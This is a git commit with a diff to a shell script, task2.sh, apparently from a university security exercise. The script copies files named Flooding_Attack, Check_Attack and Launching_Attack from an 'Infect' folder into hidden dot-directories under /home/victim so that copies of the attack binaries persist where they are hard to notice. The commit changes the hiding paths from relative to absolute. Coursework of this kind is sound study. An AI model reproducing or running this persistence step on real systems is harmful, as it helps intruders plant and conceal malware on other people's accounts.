f352b0ea649b135b6c346ac08c32af1edc40018c
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 15:25:11 +0800

    add

--- task2.sh
+++ task2.sh
@@ -1,12 +1,12 @@
 # task2
 # replication attack file to two hidden files
-Hidden1="../../.etc/.qq"
+Hidden1="/home/victim/.etc/.qq"
 mkdir -p $Hidden1
 cp ./Infect/Flooding_Attack $Hidden1
 cp ./Infect/Check_Attack $Hidden1
 cp ./Infect/Launching_Attack $Hidden1
 
-Hidden2="../../.Launch_Attack"
+Hidden2="/home/victim/.Launch_Attack"
 mkdir -p $Hidden2
 cp ./Infect/Launching_Attack $Hidden2
 
